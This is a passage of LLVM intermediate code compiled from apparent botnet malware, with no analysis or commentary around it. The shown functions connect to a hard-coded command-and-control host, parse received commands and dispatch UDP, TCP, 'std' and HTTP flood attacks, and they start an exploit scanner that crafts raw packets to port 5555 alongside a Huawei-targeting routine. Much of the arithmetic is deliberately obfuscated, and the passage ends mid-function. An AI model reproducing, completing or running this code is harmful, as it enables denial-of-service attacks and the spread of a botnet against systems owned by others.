; <label>:41:                                     ; preds = %35, %29
  %42 = load i32, i32* %3, align 4
  %43 = icmp slt i32 %42, 5
  br i1 %43, label %47, label %44

; <label>:44:                                     ; preds = %41
  %45 = load i32, i32* %3, align 4
  %46 = icmp sgt i32 %45, 5
  br i1 %46, label %47, label %48

; <label>:47:                                     ; preds = %44, %41
  br label %195

; <label>:48:                                     ; preds = %44
  %49 = call i32 @listFork()
  %50 = icmp ne i32 %49, 0
  br i1 %50, label %51, label %52

; <label>:51:                                     ; preds = %48
  br label %195

; <label>:52:                                     ; preds = %48
  %53 = load i8**, i8*** %4, align 8
  %54 = getelementptr inbounds i8*, i8** %53, i64 1
  %55 = load i8*, i8** %54, align 8
  %56 = load i8**, i8*** %4, align 8
  %57 = getelementptr inbounds i8*, i8** %56, i64 2
  %58 = load i8*, i8** %57, align 8
  %59 = call i32 @atoi(i8* %58) #10
  %60 = load i8**, i8*** %4, align 8
  %61 = getelementptr inbounds i8*, i8** %60, i64 3
  %62 = load i8*, i8** %61, align 8
  %63 = call i32 @atoi(i8* %62) #10
  %64 = load i8**, i8*** %4, align 8
  %65 = getelementptr inbounds i8*, i8** %64, i64 4
  %66 = load i8*, i8** %65, align 8
  %67 = call i32 @atoi(i8* %66) #10
  call void @udpflood(i8* %55, i32 %59, i32 %63, i32 %67)
  br label %68

; <label>:68:                                     ; preds = %52, %35
  %69 = load i8**, i8*** %4, align 8
  %70 = getelementptr inbounds i8*, i8** %69, i64 0
  %71 = load i8*, i8** %70, align 8
  %72 = call i8* @strstr(i8* %71, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.62, i32 0, i32 0)) #10
  %73 = icmp ne i8* %72, null
  br i1 %73, label %80, label %74

; <label>:74:                                     ; preds = %68
  %75 = load i8**, i8*** %4, align 8
  %76 = getelementptr inbounds i8*, i8** %75, i64 0
  %77 = load i8*, i8** %76, align 8
  %78 = call i8* @strstr(i8* %77, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.63, i32 0, i32 0)) #10
  %79 = icmp ne i8* %78, null
  br i1 %79, label %80, label %110

; <label>:80:                                     ; preds = %74, %68
  %81 = load i32, i32* %3, align 4
  %82 = icmp slt i32 %81, 6
  br i1 %82, label %86, label %83

; <label>:83:                                     ; preds = %80
  %84 = load i32, i32* %3, align 4
  %85 = icmp sgt i32 %84, 6
  br i1 %85, label %86, label %87

; <label>:86:                                     ; preds = %83, %80
  br label %195

; <label>:87:                                     ; preds = %83
  %88 = call i32 @listFork()
  %89 = icmp ne i32 %88, 0
  br i1 %89, label %90, label %91

; <label>:90:                                     ; preds = %87
  br label %195

; <label>:91:                                     ; preds = %87
  %92 = load i8**, i8*** %4, align 8
  %93 = getelementptr inbounds i8*, i8** %92, i64 1
  %94 = load i8*, i8** %93, align 8
  %95 = load i8**, i8*** %4, align 8
  %96 = getelementptr inbounds i8*, i8** %95, i64 2
  %97 = load i8*, i8** %96, align 8
  %98 = call i32 @atoi(i8* %97) #10
  %99 = load i8**, i8*** %4, align 8
  %100 = getelementptr inbounds i8*, i8** %99, i64 3
  %101 = load i8*, i8** %100, align 8
  %102 = call i32 @atoi(i8* %101) #10
  %103 = load i8**, i8*** %4, align 8
  %104 = getelementptr inbounds i8*, i8** %103, i64 4
  %105 = load i8*, i8** %104, align 8
  %106 = call i32 @atoi(i8* %105) #10
  %107 = load i8**, i8*** %4, align 8
  %108 = getelementptr inbounds i8*, i8** %107, i64 5
  %109 = load i8*, i8** %108, align 8
  call void @tcpflood(i8* %94, i32 %98, i32 %102, i32 %106, i8* %109)
  br label %110

; <label>:110:                                    ; preds = %91, %74
  %111 = load i8**, i8*** %4, align 8
  %112 = getelementptr inbounds i8*, i8** %111, i64 0
  %113 = load i8*, i8** %112, align 8
  %114 = call i8* @strstr(i8* %113, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.64, i32 0, i32 0)) #10
  %115 = icmp ne i8* %114, null
  br i1 %115, label %122, label %116

; <label>:116:                                    ; preds = %110
  %117 = load i8**, i8*** %4, align 8
  %118 = getelementptr inbounds i8*, i8** %117, i64 0
  %119 = load i8*, i8** %118, align 8
  %120 = call i8* @strstr(i8* %119, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.65, i32 0, i32 0)) #10
  %121 = icmp ne i8* %120, null
  br i1 %121, label %122, label %149

; <label>:122:                                    ; preds = %116, %110
  %123 = load i32, i32* %3, align 4
  %124 = icmp slt i32 %123, 5
  br i1 %124, label %128, label %125

; <label>:125:                                    ; preds = %122
  %126 = load i32, i32* %3, align 4
  %127 = icmp sgt i32 %126, 5
  br i1 %127, label %128, label %129

; <label>:128:                                    ; preds = %125, %122
  br label %195

; <label>:129:                                    ; preds = %125
  %130 = call i32 @listFork()
  %131 = icmp ne i32 %130, 0
  br i1 %131, label %132, label %133

; <label>:132:                                    ; preds = %129
  br label %195

; <label>:133:                                    ; preds = %129
  %134 = load i8**, i8*** %4, align 8
  %135 = getelementptr inbounds i8*, i8** %134, i64 1
  %136 = load i8*, i8** %135, align 8
  %137 = load i8**, i8*** %4, align 8
  %138 = getelementptr inbounds i8*, i8** %137, i64 2
  %139 = load i8*, i8** %138, align 8
  %140 = call i32 @atoi(i8* %139) #10
  %141 = load i8**, i8*** %4, align 8
  %142 = getelementptr inbounds i8*, i8** %141, i64 3
  %143 = load i8*, i8** %142, align 8
  %144 = call i32 @atoi(i8* %143) #10
  %145 = load i8**, i8*** %4, align 8
  %146 = getelementptr inbounds i8*, i8** %145, i64 4
  %147 = load i8*, i8** %146, align 8
  %148 = call i32 @atoi(i8* %147) #10
  call void @stdflood(i8* %136, i32 %140, i32 %144, i32 %148)
  br label %149

; <label>:149:                                    ; preds = %133, %116
  %150 = load i8**, i8*** %4, align 8
  %151 = getelementptr inbounds i8*, i8** %150, i64 0
  %152 = load i8*, i8** %151, align 8
  %153 = call i8* @strstr(i8* %152, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.66, i32 0, i32 0)) #10
  %154 = icmp ne i8* %153, null
  br i1 %154, label %161, label %155

; <label>:155:                                    ; preds = %149
  %156 = load i8**, i8*** %4, align 8
  %157 = getelementptr inbounds i8*, i8** %156, i64 0
  %158 = load i8*, i8** %157, align 8
  %159 = call i8* @strstr(i8* %158, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.67, i32 0, i32 0)) #10
  %160 = icmp ne i8* %159, null
  br i1 %160, label %161, label %195

; <label>:161:                                    ; preds = %155, %149
  %162 = load i32, i32* %3, align 4
  %163 = icmp slt i32 %162, 7
  br i1 %163, label %167, label %164

; <label>:164:                                    ; preds = %161
  %165 = load i32, i32* %3, align 4
  %166 = icmp sgt i32 %165, 7
  br i1 %166, label %167, label %168

; <label>:167:                                    ; preds = %164, %161
  br label %195

; <label>:168:                                    ; preds = %164
  %169 = call i32 @listFork()
  %170 = icmp ne i32 %169, 0
  br i1 %170, label %171, label %172

; <label>:171:                                    ; preds = %168
  br label %195

; <label>:172:                                    ; preds = %168
  %173 = load i8**, i8*** %4, align 8
  %174 = getelementptr inbounds i8*, i8** %173, i64 1
  %175 = load i8*, i8** %174, align 8
  %176 = load i8**, i8*** %4, align 8
  %177 = getelementptr inbounds i8*, i8** %176, i64 2
  %178 = load i8*, i8** %177, align 8
  %179 = load i8**, i8*** %4, align 8
  %180 = getelementptr inbounds i8*, i8** %179, i64 3
  %181 = load i8*, i8** %180, align 8
  %182 = call i32 @atoi(i8* %181) #10
  %183 = trunc i32 %182 to i16
  %184 = load i8**, i8*** %4, align 8
  %185 = getelementptr inbounds i8*, i8** %184, i64 4
  %186 = load i8*, i8** %185, align 8
  %187 = load i8**, i8*** %4, align 8
  %188 = getelementptr inbounds i8*, i8** %187, i64 5
  %189 = load i8*, i8** %188, align 8
  %190 = call i32 @atoi(i8* %189) #10
  %191 = load i8**, i8*** %4, align 8
  %192 = getelementptr inbounds i8*, i8** %191, i64 6
  %193 = load i8*, i8** %192, align 8
  %194 = call i32 @atoi(i8* %193) #10
  call void @httpflood(i8* %175, i8* %178, i16 zeroext %183, i8* %186, i32 %190, i32 %194)
  br label %195

; <label>:195:                                    ; preds = %172, %171, %167, %155, %132, %128, %90, %86, %51, %47
  ret void
}

; Function Attrs: nounwind readonly
declare i8* @strstr(i8*, i8*) #4

; Function Attrs: nounwind readonly
declare i32 @atoi(i8*) #4

; Function Attrs: noinline nounwind uwtable
define void @parse_buffer(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca [11 x i8*], align 16
  %6 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  store i32 0, i32* %4, align 4
  %7 = bitcast [11 x i8*]* %5 to i8*
  call void @llvm.memset.p0i8.i64(i8* %7, i8 0, i64 88, i32 16, i1 false)
  %8 = load i8*, i8** %2, align 8
  %9 = call i8* @strtok(i8* %8, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.68, i32 0, i32 0)) #6
  store i8* %9, i8** %6, align 8
  br label %10

; <label>:10:                                     ; preds = %18, %1
  %11 = load i8*, i8** %6, align 8
  %12 = icmp ne i8* %11, null
  br i1 %12, label %13, label %16

; <label>:13:                                     ; preds = %10
  %14 = load i32, i32* %4, align 4
  %15 = icmp slt i32 %14, 10
  br label %16

; <label>:16:                                     ; preds = %13, %10
  %17 = phi i1 [ false, %10 ], [ %15, %13 ]
  br i1 %17, label %18, label %41

; <label>:18:                                     ; preds = %16
  %19 = load i8*, i8** %6, align 8
  %20 = call i64 @strlen(i8* %19) #10
  %21 = sub i64 0, 1
  %22 = sub i64 %20, %21
  %23 = add i64 %20, 1
  %24 = call noalias i8* @malloc(i64 %22) #6
  %25 = load i32, i32* %4, align 4
  %26 = sub i32 0, 1
  %27 = sub i32 %25, %26
  %28 = add nsw i32 %25, 1
  store i32 %27, i32* %4, align 4
  %29 = sext i32 %25 to i64
  %30 = getelementptr inbounds [11 x i8*], [11 x i8*]* %5, i64 0, i64 %29
  store i8* %24, i8** %30, align 8
  %31 = load i32, i32* %4, align 4
  %32 = sub i32 0, 1
  %33 = add i32 %31, %32
  %34 = sub nsw i32 %31, 1
  %35 = sext i32 %33 to i64
  %36 = getelementptr inbounds [11 x i8*], [11 x i8*]* %5, i64 0, i64 %35
  %37 = load i8*, i8** %36, align 8
  %38 = load i8*, i8** %6, align 8
  %39 = call i8* @strcpy(i8* %37, i8* %38) #6
  %40 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.68, i32 0, i32 0)) #6
  store i8* %40, i8** %6, align 8
  br label %10

; <label>:41:                                     ; preds = %16
  %42 = load i32, i32* %4, align 4
  %43 = icmp sgt i32 %42, 0
  br i1 %43, label %44, label %47

; <label>:44:                                     ; preds = %41
  %45 = load i32, i32* %4, align 4
  %46 = getelementptr inbounds [11 x i8*], [11 x i8*]* %5, i32 0, i32 0
  call void @proc_cmd(i32 %45, i8** %46)
  br label %47

; <label>:47:                                     ; preds = %44, %41
  store i32 0, i32* %3, align 4
  br label %48

; <label>:48:                                     ; preds = %57, %47
  %49 = load i32, i32* %3, align 4
  %50 = load i32, i32* %4, align 4
  %51 = icmp slt i32 %49, %50
  br i1 %51, label %52, label %62

; <label>:52:                                     ; preds = %48
  %53 = load i32, i32* %3, align 4
  %54 = sext i32 %53 to i64
  %55 = getelementptr inbounds [11 x i8*], [11 x i8*]* %5, i64 0, i64 %54
  %56 = load i8*, i8** %55, align 8
  call void @free(i8* %56) #6
  br label %57

; <label>:57:                                     ; preds = %52
  %58 = load i32, i32* %3, align 4
  %59 = sub i32 0, 1
  %60 = sub i32 %58, %59
  %61 = add nsw i32 %58, 1
  store i32 %60, i32* %3, align 4
  br label %48

; <label>:62:                                     ; preds = %48
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @qbot() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca [11 x i8*], align 16
  %4 = call i32 @fork() #6
  %5 = icmp sgt i32 %4, 0
  br i1 %5, label %6, label %7

; <label>:6:                                      ; preds = %0
  br label %81

; <label>:7:                                      ; preds = %0
  store i32 0, i32* %2, align 4
  %8 = bitcast [11 x i8*]* %3 to i8*
  call void @llvm.memset.p0i8.i64(i8* %8, i8 0, i64 88, i32 16, i1 false)
  %9 = call i32 @resolve_http()
  br label %10

; <label>:10:                                     ; preds = %43, %7
  %11 = load i32, i32* @C2, align 4
  %12 = load i32, i32* @C2, align 4
  %13 = call i32 (i32, i32, ...) @fcntl(i32 %12, i32 3, i32 0)
  %14 = and i32 %13, 2048
  %15 = xor i32 %13, 2048
  %16 = or i32 %14, %15
  %17 = or i32 %13, 2048
  %18 = call i32 (i32, i32, ...) @fcntl(i32 %11, i32 4, i32 %16)
  %19 = call i32 @socket(i32 2, i32 1, i32 0) #6
  store i32 %19, i32* @C2, align 4
  %20 = icmp eq i32 %19, -1
  br i1 %20, label %21, label %25

; <label>:21:                                     ; preds = %10
  %22 = load i32, i32* @C2, align 4
  %23 = call i32 @close(i32 %22)
  %24 = call i32 @close(i32 0)
  br label %25

; <label>:25:                                     ; preds = %21, %10
  store i16 2, i16* getelementptr inbounds (%struct.sockaddr_in, %struct.sockaddr_in* @Socket, i32 0, i32 0), align 4
  %26 = call i32 @inet_addr(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @c2_host, i32 0, i32 0)) #6
  store i32 %26, i32* getelementptr inbounds (%struct.sockaddr_in, %struct.sockaddr_in* @Socket, i32 0, i32 2, i32 0), align 4
  %27 = load i32, i32* @c2_bot_port, align 4
  %28 = trunc i32 %27 to i16
  %29 = call zeroext i16 @htons(i16 zeroext %28) #9
  store i16 %29, i16* getelementptr inbounds (%struct.sockaddr_in, %struct.sockaddr_in* @Socket, i32 0, i32 1), align 2
  %30 = load i32, i32* @C2, align 4
  %31 = call i32 @connect(i32 %30, %struct.sockaddr* bitcast (%struct.sockaddr_in* @Socket to %struct.sockaddr*), i32 16)
  %32 = icmp eq i32 %31, -1
  br i1 %32, label %33, label %53

; <label>:33:                                     ; preds = %25
  %34 = load i32, i32* @retry, align 4
  %35 = icmp eq i32 %34, 3
  br i1 %35, label %36, label %40

; <label>:36:                                     ; preds = %33
  %37 = load i32, i32* @C2, align 4
  %38 = call i32 @close(i32 %37)
  %39 = call i32 @close(i32 0)
  br label %52

; <label>:40:                                     ; preds = %33
  %41 = load i32, i32* @tryagain, align 4
  %42 = icmp eq i32 %41, 1
  br i1 %42, label %43, label %51

; <label>:43:                                     ; preds = %40
  %44 = load i32, i32* @C2, align 4
  %45 = call i32 @close(i32 %44)
  %46 = load i32, i32* @retry, align 4
  %47 = add i32 %46, -2033681836
  %48 = add i32 %47, 1
  %49 = sub i32 %48, -2033681836
  %50 = add nsw i32 %46, 1
  store i32 %49, i32* @retry, align 4
  br label %10

; <label>:51:                                     ; preds = %40
  br label %52

; <label>:52:                                     ; preds = %51, %36
  br label %81

; <label>:53:                                     ; preds = %25
  call void @registerme(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.69, i32 0, i32 0))
  br label %54

; <label>:54:                                     ; preds = %77, %53
  %55 = load i32, i32* @C2, align 4
  %56 = call i64 @read(i32 %55, i8* getelementptr inbounds ([1024 x i8], [1024 x i8]* @buf, i32 0, i32 0), i64 1024)
  %57 = trunc i64 %56 to i32
  store i32 %57, i32* @buffer, align 4
  %58 = icmp ne i32 %57, 0
  br i1 %58, label %59, label %78

; <label>:59:                                     ; preds = %54
  %60 = load i32, i32* @buffer, align 4
  %61 = sext i32 %60 to i64
  %62 = getelementptr inbounds [1024 x i8], [1024 x i8]* @buf, i64 0, i64 %61
  store i8 0, i8* %62, align 1
  %63 = call i8* @strstr(i8* getelementptr inbounds ([1024 x i8], [1024 x i8]* @buf, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.70, i32 0, i32 0)) #10
  %64 = icmp ne i8* %63, null
  br i1 %64, label %65, label %68

; <label>:65:                                     ; preds = %59
  %66 = load i32, i32* @C2, align 4
  %67 = call i64 @write(i32 %66, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.71, i32 0, i32 0), i64 6)
  br label %68

; <label>:68:                                     ; preds = %65, %59
  %69 = call i8* @strstr(i8* getelementptr inbounds ([1024 x i8], [1024 x i8]* @buf, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.72, i32 0, i32 0)) #10
  %70 = icmp ne i8* %69, null
  br i1 %70, label %71, label %72

; <label>:71:                                     ; preds = %68
  br label %78

; <label>:72:                                     ; preds = %68
  %73 = load i8*, i8** @trigger, align 8
  %74 = call i8* @strstr(i8* getelementptr inbounds ([1024 x i8], [1024 x i8]* @buf, i32 0, i32 0), i8* %73) #10
  %75 = icmp ne i8* %74, null
  br i1 %75, label %76, label %77

; <label>:76:                                     ; preds = %72
  call void @parse_buffer(i8* getelementptr inbounds ([1024 x i8], [1024 x i8]* @buf, i32 0, i32 0))
  br label %77

; <label>:77:                                     ; preds = %76, %72
  br label %54

; <label>:78:                                     ; preds = %71, %54
  %79 = load i32, i32* @C2, align 4
  %80 = call i32 @close(i32 %79)
  call void @exit(i32 0) #12
  unreachable

; <label>:81:                                     ; preds = %52, %6
  ret void
}

declare i32 @fcntl(i32, i32, ...) #5

; Function Attrs: noinline nounwind uwtable
define i32 @main(i32, i8**) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  call void @qbot()
  call void @table_init()
  call void @watchdog_maintain()
  %7 = call i32 @rand() #6
  %8 = srem i32 %7, 1
  store i32 %8, i32* %6, align 4
  %9 = load i32, i32* %6, align 4
  %10 = icmp eq i32 %9, 0
  br i1 %10, label %11, label %12

; <label>:11:                                     ; preds = %2
  call void (...) bitcast (void ()* @huawei_init to void (...)*)()
  br label %17

; <label>:12:                                     ; preds = %2
  %13 = load i32, i32* %6, align 4
  %14 = icmp eq i32 %13, 1
  br i1 %14, label %15, label %16

; <label>:15:                                     ; preds = %12
  call void (...) bitcast (void ()* @exploit_init to void (...)*)()
  br label %16

; <label>:16:                                     ; preds = %15, %12
  br label %17

; <label>:17:                                     ; preds = %16, %11
  %18 = load i32, i32* %3, align 4
  ret i32 %18
}

; Function Attrs: noinline nounwind uwtable
define void @exploit_init() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i16, align 2
  %3 = alloca %struct.iphdr*, align 8
  %4 = alloca %struct.anon.0*, align 8
  %5 = alloca %struct.fd_set, align 8
  %6 = alloca %struct.fd_set, align 8
  %7 = alloca %struct.exploit_scanner_connection*, align 8
  %8 = alloca %struct.timeval, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca %struct.sockaddr_in, align 4
  %15 = alloca %struct.iphdr*, align 8
  %16 = alloca %struct.anon.0*, align 8
  %17 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %18 = alloca i32, align 4
  %19 = alloca [1514 x i8], align 16
  %20 = alloca %struct.iphdr*, align 8
  %21 = alloca %struct.anon.0*, align 8
  %22 = alloca %struct.exploit_scanner_connection*, align 8
  %23 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  %26 = alloca i32, align 4
  %27 = alloca i32, align 4
  %28 = alloca i32, align 4
  %29 = alloca i32, align 4
  %30 = alloca i32, align 4
  %31 = alloca i32, align 4
  %32 = alloca i32, align 4
  %33 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  %34 = call i32 @fork() #6
  store i32 %34, i32* @exploit_scanner_pid, align 4
  %35 = load i32, i32* @exploit_scanner_pid, align 4
  %36 = icmp sgt i32 %35, 0
  br i1 %36, label %40, label %37

; <label>:37:                                     ; preds = %0
  %38 = load i32, i32* @exploit_scanner_pid, align 4
  %39 = icmp eq i32 %38, -1
  br i1 %39, label %40, label %41

; <label>:40:                                     ; preds = %37, %0
  ret void

; <label>:41:                                     ; preds = %37
  %42 = call i32 @util_local_addr()
  store i32 %42, i32* @LOCAL_ADDR, align 4
  call void @rand_init()
  %43 = call i64 @time(i64* null) #6
  %44 = trunc i64 %43 to i32
  store i32 %44, i32* @exploit_fake_time, align 4
  %45 = call noalias i8* @calloc(i64 128, i64 5416) #6
  %46 = bitcast i8* %45 to %struct.exploit_scanner_connection*
  store %struct.exploit_scanner_connection* %46, %struct.exploit_scanner_connection** @conn_table, align 8
  store i32 0, i32* %1, align 4
  br label %47

; <label>:47:                                     ; preds = %61, %41
  %48 = load i32, i32* %1, align 4
  %49 = icmp slt i32 %48, 128
  br i1 %49, label %50, label %68

; <label>:50:                                     ; preds = %47
  %51 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** @conn_table, align 8
  %52 = load i32, i32* %1, align 4
  %53 = sext i32 %52 to i64
  %54 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %51, i64 %53
  %55 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %54, i32 0, i32 2
  store i32 0, i32* %55, align 8
  %56 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** @conn_table, align 8
  %57 = load i32, i32* %1, align 4
  %58 = sext i32 %57 to i64
  %59 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %56, i64 %58
  %60 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %59, i32 0, i32 0
  store i32 -1, i32* %60, align 8
  br label %61

; <label>:61:                                     ; preds = %50
  %62 = load i32, i32* %1, align 4
  %63 = sub i32 0, %62
  %64 = sub i32 0, 1
  %65 = add i32 %63, %64
  %66 = sub i32 0, %65
  %67 = add nsw i32 %62, 1
  store i32 %66, i32* %1, align 4
  br label %47

; <label>:68:                                     ; preds = %47
  %69 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %69, i32* @exploit_rsck, align 4
  %70 = icmp eq i32 %69, -1
  br i1 %70, label %71, label %72

; <label>:71:                                     ; preds = %68
  call void @exit(i32 0) #12
  unreachable

; <label>:72:                                     ; preds = %68
  %73 = load i32, i32* @exploit_rsck, align 4
  %74 = load i32, i32* @exploit_rsck, align 4
  %75 = call i32 (i32, i32, ...) @fcntl(i32 %74, i32 3, i32 0)
  %76 = xor i32 2048, -1
  %77 = xor i32 %75, -1
  %78 = xor i32 -652186957, -1
  %79 = and i32 %76, -652186957
  %80 = and i32 2048, %78
  %81 = and i32 %77, -652186957
  %82 = and i32 %75, %78
  %83 = or i32 %79, %80
  %84 = or i32 %81, %82
  %85 = xor i32 %83, %84
  %86 = or i32 %76, %77
  %87 = xor i32 %86, -1
  %88 = or i32 -652186957, %78
  %89 = and i32 %87, %88
  %90 = or i32 %85, %89
  %91 = or i32 2048, %75
  %92 = call i32 (i32, i32, ...) @fcntl(i32 %73, i32 4, i32 %90)
  store i32 1, i32* %1, align 4
  %93 = load i32, i32* @exploit_rsck, align 4
  %94 = bitcast i32* %1 to i8*
  %95 = call i32 @setsockopt(i32 %93, i32 0, i32 3, i8* %94, i32 4) #6
  %96 = icmp ne i32 %95, 0
  br i1 %96, label %97, label %100

; <label>:97:                                     ; preds = %72
  %98 = load i32, i32* @exploit_rsck, align 4
  %99 = call i32 @close(i32 %98)
  call void @exit(i32 0) #12
  unreachable

; <label>:100:                                    ; preds = %72
  br label %101

; <label>:101:                                    ; preds = %112, %100
  %102 = call i32 @rand_next()
  %103 = xor i32 %102, -1
  %104 = xor i32 65535, -1
  %105 = xor i32 2069870484, -1
  %106 = or i32 %103, %104
  %107 = or i32 2069870484, %105
  %108 = xor i32 %106, -1
  %109 = and i32 %108, %107
  %110 = and i32 %102, 65535
  %111 = trunc i32 %109 to i16
  store i16 %111, i16* %2, align 2
  br label %112

; <label>:112:                                    ; preds = %101
  %113 = load i16, i16* %2, align 2
  %114 = call zeroext i16 @ntohs(i16 zeroext %113) #9
  %115 = zext i16 %114 to i32
  %116 = icmp slt i32 %115, 1024
  br i1 %116, label %101, label %117

; <label>:117:                                    ; preds = %112
  store %struct.iphdr* bitcast ([40 x i8]* @exploit_scanner_rawpkt to %struct.iphdr*), %struct.iphdr** %3, align 8
  %118 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %119 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %118, i64 1
  %120 = bitcast %struct.iphdr* %119 to %struct.anon.0*
  store %struct.anon.0* %120, %struct.anon.0** %4, align 8
  %121 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %122 = bitcast %struct.iphdr* %121 to i8*
  %123 = load i8, i8* %122, align 4
  %124 = xor i8 %123, -1
  %125 = xor i8 -16, -1
  %126 = xor i8 27, -1
  %127 = or i8 %124, %125
  %128 = or i8 27, %126
  %129 = xor i8 %127, -1
  %130 = and i8 %129, %128
  %131 = and i8 %123, -16
  %132 = xor i8 %130, -1
  %133 = xor i8 5, -1
  %134 = xor i8 102, -1
  %135 = and i8 %132, 102
  %136 = and i8 %130, %134
  %137 = and i8 %133, 102
  %138 = and i8 5, %134
  %139 = or i8 %135, %136
  %140 = or i8 %137, %138
  %141 = xor i8 %139, %140
  %142 = or i8 %132, %133
  %143 = xor i8 %142, -1
  %144 = or i8 102, %134
  %145 = and i8 %143, %144
  %146 = or i8 %141, %145
  %147 = or i8 %130, 5
  store i8 %146, i8* %122, align 4
  %148 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %149 = bitcast %struct.iphdr* %148 to i8*
  %150 = load i8, i8* %149, align 4
  %151 = xor i8 15, -1
  %152 = xor i8 %150, %151
  %153 = and i8 %152, %150
  %154 = and i8 %150, 15
  %155 = xor i8 %153, -1
  %156 = xor i8 64, -1
  %157 = xor i8 85, -1
  %158 = and i8 %155, 85
  %159 = and i8 %153, %157
  %160 = and i8 %156, 85
  %161 = and i8 64, %157
  %162 = or i8 %158, %159
  %163 = or i8 %160, %161
  %164 = xor i8 %162, %163
  %165 = or i8 %155, %156
  %166 = xor i8 %165, -1
  %167 = or i8 85, %157
  %168 = and i8 %166, %167
  %169 = or i8 %164, %168
  %170 = or i8 %153, 64
  store i8 %169, i8* %149, align 4
  %171 = call zeroext i16 @htons(i16 zeroext 40) #9
  %172 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %173 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %172, i32 0, i32 2
  store i16 %171, i16* %173, align 2
  %174 = call i32 @rand_next()
  %175 = trunc i32 %174 to i16
  %176 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %177 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %176, i32 0, i32 3
  store i16 %175, i16* %177, align 4
  %178 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %179 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %178, i32 0, i32 5
  store i8 64, i8* %179, align 4
  %180 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %181 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %180, i32 0, i32 6
  store i8 6, i8* %181, align 1
  %182 = call zeroext i16 @htons(i16 zeroext 5555) #9
  %183 = load %struct.anon.0*, %struct.anon.0** %4, align 8
  %184 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %183, i32 0, i32 1
  store i16 %182, i16* %184, align 2
  %185 = load i16, i16* %2, align 2
  %186 = load %struct.anon.0*, %struct.anon.0** %4, align 8
  %187 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %186, i32 0, i32 0
  store i16 %185, i16* %187, align 4
  %188 = load %struct.anon.0*, %struct.anon.0** %4, align 8
  %189 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %188, i32 0, i32 4
  %190 = load i16, i16* %189, align 4
  %191 = xor i16 %190, -1
  %192 = xor i16 -241, -1
  %193 = xor i16 -21596, -1
  %194 = or i16 %191, %192
  %195 = or i16 -21596, %193
  %196 = xor i16 %194, -1
  %197 = and i16 %196, %195
  %198 = and i16 %190, -241
  %199 = xor i16 %197, -1
  %200 = xor i16 80, -1
  %201 = xor i16 556, -1
  %202 = and i16 %199, 556
  %203 = and i16 %197, %201
  %204 = and i16 %200, 556
  %205 = and i16 80, %201
  %206 = or i16 %202, %203
  %207 = or i16 %204, %205
  %208 = xor i16 %206, %207
  %209 = or i16 %199, %200
  %210 = xor i16 %209, -1
  %211 = or i16 556, %201
  %212 = and i16 %210, %211
  %213 = or i16 %208, %212
  %214 = or i16 %197, 80
  store i16 %213, i16* %189, align 4
  %215 = call i32 @rand_next()
  %216 = xor i32 65535, -1
  %217 = xor i32 %215, %216
  %218 = and i32 %217, %215
  %219 = and i32 %215, 65535
  %220 = trunc i32 %218 to i16
  %221 = load %struct.anon.0*, %struct.anon.0** %4, align 8
  %222 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %221, i32 0, i32 5
  store i16 %220, i16* %222, align 2
  %223 = load %struct.anon.0*, %struct.anon.0** %4, align 8
  %224 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %223, i32 0, i32 4
  %225 = load i16, i16* %224, align 4
  %226 = xor i16 %225, -1
  %227 = xor i16 -513, -1
  %228 = xor i16 -11487, -1
  %229 = or i16 %226, %227
  %230 = or i16 -11487, %228
  %231 = xor i16 %229, -1
  %232 = and i16 %231, %230
  %233 = and i16 %225, -513
  %234 = and i16 %232, 512
  %235 = xor i16 %232, 512
  %236 = or i16 %234, %235
  %237 = or i16 %232, 512
  store i16 %236, i16* %224, align 4
  br label %238

; <label>:238:                                    ; preds = %914, %117
